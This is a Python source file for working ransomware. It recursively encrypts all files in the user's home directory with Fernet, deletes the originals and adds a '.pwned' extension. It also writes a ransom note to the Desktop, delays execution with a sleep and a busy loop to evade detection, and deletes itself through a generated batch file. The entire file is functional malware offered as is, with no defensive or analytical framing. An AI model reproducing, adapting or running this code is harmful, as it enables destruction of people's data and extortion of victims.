import os
import random
import subprocess
import time
import sys
from cryptography.fernet import Fernet

path_exceptions = ["AppData", ".idlerc", "Searches"]
filetype_exceptions = [".ini", ".DAT"]
extension = ".pwned"

def discovery(base):
    # search for files in user home directory
    # return a list of paths to files
    paths = []
    
    for root, dirs, files in os.walk(base):
        dirs[:] = [d for d in dirs if d not in path_exceptions]
        for file in files:
            try:
                if not any(file.endswith(ext) for ext in filetype_exceptions):
                    full_path = os.path.join(root, file)
                    paths.append(full_path)
            except Exception as e:
                print(f"Error accessing file {file}: {e}")
    
    return paths

def cryptor(paths):
    # read file data
    # encrypt file data
    # write encrypted data to file
    # rename the data with custom extension
    
    key = Fernet.generate_key()
    fer = Fernet(key)

    exe_name = None
    
    for path in paths:
        name, ext = os.path.splitext(path)  
        newname = name + ext + extension

        if "RunMe.exe" in path:
            exe_name = newname  # Track the renamed executable
        
        try:
            
            with open(path, "rb") as f:
                data = f.read()
                tokenized = fer.encrypt(data)
        except Exception as e:
            print(f"Error tokenizing file data: {e}")
            continue # go to next file if encryption fails
        
        try:
            with open(newname, "wb") as f:
                f.write(tokenized)
            os.remove(path)
        except Exception as e: 
            print(f"Error writing file: {e}")
    
    return key, exe_name

def message(key):
    # Decode the key if it's in bytes format
    key_str = key.decode("utf-8") if isinstance(key, bytes) else key
    saywhat = f"""
    All of your files have been encrypted.
    To unlock them contact me with your encryption code in this email@email.com
    Your encryption code is: {key_str}
    """
    path = os.path.join(os.path.expanduser("~"), "Desktop")
    filepath = os.path.join(path, "AreYouWinningSon.txt")
    with open(filepath, "w") as f:
        f.write(saywhat)
    return filepath

def suicide(exe_name):
    if getattr(sys, 'frozen', False):
        try:
            script_path = sys.executable
            enc_script_exe = exe_name
            batch_script = f'''
@echo off
:loop
timeout /t 1 > nul
del "{script_path}" > nul 2>&1
del "{enc_script_exe}" > nul 2>&1
if exist "{script_path}" goto loop
if exist "{enc_script_exe}" goto loop
del %0 > nul 2>&1
'''
            # Write the batch file to the same directory as the executable
            batch_file = os.path.join(os.path.dirname(script_path), "delete_me.bat")
            with open(batch_file, "w") as f:
                f.write(batch_script)
            # Execute the batch file in minimized mode
            subprocess.Popen(f'start /min {batch_file}', shell=True)
            print("Self-destruction scheduled successfully.")
        except Exception as e:
            print(f"Error during self-deletion setup: {e}")
    else: 
        path = os.path.abspath(__file__)
        try:
            os.remove(path)
            print("Self-destruction successful.")
        except Exception as e:
            print(f"Error with self-destruction: {e}")


if __name__ == '__main__':
    # Anti-radar: sleep-delayed execution, incrementer
    time.sleep(random.randint(10, 50))
    
    inc = 0
    while inc < 10000001:
        inc += 1
    
    # get user home dir
    user_dir = os.path.expanduser("~")
    
    # find the files
    files = discovery(user_dir)
    
    print(f"Total files found: {len(files)}")
    print(f"Sample files:", files[:10])
    
    # do the magic
    key, exe_name = cryptor(files)
    
    print(f"Files encrypted with following key: {key}")
    
    # make "give money" note
    msgpath = message(key)
    
    try: 
        os.system("start " + msgpath)
    except Exception as e:
        print(f"Failed to open the note: {e}")
    
    suicide(exe_name)
